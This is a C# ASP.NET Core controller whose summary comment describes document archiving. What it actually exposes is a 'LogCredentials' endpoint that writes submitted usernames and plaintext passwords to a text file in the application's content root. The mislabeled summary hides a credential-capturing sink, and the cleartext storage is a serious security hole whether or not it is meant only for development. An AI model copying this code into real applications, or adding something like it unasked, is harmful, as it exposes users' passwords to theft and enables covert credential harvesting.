using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc;

namespace Kms.Api.Controllers
{
    /// <summary>
    /// Definition of units and the archive of their documents.
    /// </summary>
    public class DevLogsController : KmsBaseController
    {

        private static readonly object _lock = new();
        private readonly string _path;

        public DevLogsController(IWebHostEnvironment env)
        {
            var contentRoot = env.ContentRootPath; // همیشه معتبر
            var logDir = Path.Combine(contentRoot, "Mylogs");
            Directory.CreateDirectory(logDir);

            _path = Path.Combine(logDir, "login_inputs_dev.txt");
        }

        public class CredDto
        {
            public string? Username { get; set; } 
            public string? Password { get; set; }
        }

        [HttpPost]
        public IActionResult LogCredentials([FromBody] CredDto? dto)
        {
            
            if (dto is null) return BadRequest();

            var line = JsonSerializer.Serialize(new
            {
                username = dto.Username,
                password = dto.Password,
                timestampUtc = DateTime.UtcNow.ToString("o")
            });

            lock (_lock)
            {
                System.IO.File.AppendAllText(_path, line + Environment.NewLine, Encoding.UTF8);
            }

            return Ok(new { logged = true });
        }
    }
}
